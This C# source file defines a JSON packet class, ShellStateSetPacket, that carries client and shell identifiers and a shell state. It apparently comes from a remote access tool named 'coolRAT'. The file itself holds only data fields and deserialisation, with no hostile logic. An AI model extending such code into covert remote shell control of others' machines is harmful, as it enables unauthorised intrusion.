using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class ShellStateSetPacket : Packet
    {
        public Guid ClientUniqueId;
        public Guid ShellUniqueId;
        public ShellState ShellState;
        public bool Success;

        public ShellStateSetPacket(Guid clientUniqueId, Guid shellUniqueId, ShellState shellState, bool success)
        {
            ClientUniqueId = clientUniqueId;
            ShellUniqueId = shellUniqueId;
            ShellState = shellState;
            Success = success;
            Type = "ShellStateSetPacket";
        }

        public static new ShellStateSetPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<ShellStateSetPacket>(packet_string);
        }
    }
}
